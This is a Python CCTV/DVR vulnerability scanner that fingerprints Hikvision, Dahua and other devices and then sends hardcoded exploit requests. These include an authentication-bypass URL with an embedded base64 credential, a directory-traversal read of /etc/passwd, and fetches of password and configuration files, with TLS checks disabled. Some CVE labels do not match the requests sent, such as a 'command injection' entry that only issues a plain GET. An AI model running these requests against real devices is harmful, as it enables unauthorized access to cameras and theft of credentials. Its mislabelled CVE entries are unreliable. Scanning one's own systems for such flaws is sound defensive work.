#!/usr/bin/env python3
"""
Vulnerability Scanner
Scans for known CVEs and vulnerabilities in CCTV/DVR systems
"""

import requests
import re
from typing import List, Dict, Optional
import warnings

warnings.filterwarnings('ignore', message='Unverified HTTPS request')


class VulnerabilityScanner:
    """Scans for known vulnerabilities in CCTV/DVR devices"""
    
    # Known vulnerabilities database
    VULNERABILITY_DATABASE = {
        "hikvision": {
            "CVE-2017-7921": {
                "description": "Hikvision IP cameras unauthorized access vulnerability",
                "severity": "Critical",
                "path": "/System/configurationFile?auth=YWRtaW46MTEK",
                "method": "GET",
                "check": lambda r: r.status_code == 200 and "admin" in r.text.lower()
            },
            "CVE-2021-36260": {
                "description": "Hikvision web server command injection",
                "severity": "Critical",
                "path": "/Security/users?auth=YWRtaW46MTEK",
                "method": "GET",
                "check": lambda r: r.status_code == 200
            }
        },
        "dahua": {
            "CVE-2021-33044": {
                "description": "Dahua authentication bypass",
                "severity": "Critical",
                "path": "/current_config/passwd",
                "method": "GET",
                "check": lambda r: r.status_code == 200 and "password" in r.text.lower()
            }
        },
        "generic": {
            "DIR_TRAVERSAL": {
                "description": "Directory traversal vulnerability",
                "severity": "High",
                "path": "/../../../etc/passwd",
                "method": "GET",
                "check": lambda r: "root:" in r.text
            },
            "INFO_DISCLOSURE": {
                "description": "Information disclosure via configuration files",
                "severity": "Medium",
                "paths": ["/config.xml", "/config.json", "/system.xml", "/config/config.xml"],
                "method": "GET",
                "check": lambda r: r.status_code == 200 and len(r.text) > 100
            }
        }
    }
    
    def __init__(self, timeout: int = 5):
        """
        Initialize vulnerability scanner
        
        Args:
            timeout: Request timeout in seconds
        """
        self.timeout = timeout
        self.session = requests.Session()
        self.session.verify = False
    
    def detect_device_type(self, host: str, port: int = 80, 
                          protocol: str = "http") -> Optional[str]:
        """
        Attempt to detect device manufacturer
        
        Args:
            host: Target host
            port: Port number
            protocol: Protocol (http/https)
            
        Returns:
            Detected manufacturer or None
        """
        url = f"{protocol}://{host}:{port}"
        
        try:
            response = self.session.get(url, timeout=self.timeout)
            headers = response.headers
            content = response.text.lower()
            
            # Check headers and content for manufacturer signatures
            if "hikvision" in content or "hikvision" in str(headers).lower():
                return "hikvision"
            elif "dahua" in content or "dahua" in str(headers).lower():
                return "dahua"
            elif "axis" in content or "axis" in str(headers).lower():
                return "axis"
            elif "foscam" in content:
                return "foscam"
            
        except:
            pass
        
        return None
    
    def check_vulnerability(self, url: str, vuln_info: Dict) -> bool:
        """
        Check for a specific vulnerability
        
        Args:
            url: Base URL
            vuln_info: Vulnerability information
            
        Returns:
            True if vulnerable
        """
        try:
            # Handle single path
            if "path" in vuln_info:
                test_url = url + vuln_info["path"]
                response = self.session.request(
                    vuln_info["method"],
                    test_url,
                    timeout=self.timeout
                )
                return vuln_info["check"](response)
            
            # Handle multiple paths
            elif "paths" in vuln_info:
                for path in vuln_info["paths"]:
                    test_url = url + path
                    response = self.session.request(
                        vuln_info["method"],
                        test_url,
                        timeout=self.timeout
                    )
                    if vuln_info["check"](response):
                        return True
        except:
            pass
        
        return False
    
    def scan(self, host: str, port: int = 80, 
            protocol: str = "http") -> List[Dict[str, str]]:
        """
        Scan for vulnerabilities
        
        Args:
            host: Target host
            port: Port number
            protocol: Protocol (http/https)
            
        Returns:
            List of detected vulnerabilities
        """
        url = f"{protocol}://{host}:{port}"
        vulnerabilities = []
        
        # Detect device type
        device_type = self.detect_device_type(host, port, protocol)
        
        # Check manufacturer-specific vulnerabilities
        if device_type and device_type in self.VULNERABILITY_DATABASE:
            for cve, vuln_info in self.VULNERABILITY_DATABASE[device_type].items():
                if self.check_vulnerability(url, vuln_info):
                    vulnerabilities.append({
                        "cve": cve,
                        "description": vuln_info["description"],
                        "severity": vuln_info["severity"],
                        "device_type": device_type
                    })
        
        # Check generic vulnerabilities
        for vuln_name, vuln_info in self.VULNERABILITY_DATABASE["generic"].items():
            if self.check_vulnerability(url, vuln_info):
                vulnerabilities.append({
                    "cve": vuln_name,
                    "description": vuln_info["description"],
                    "severity": vuln_info["severity"],
                    "device_type": device_type or "Unknown"
                })
        
        return vulnerabilities
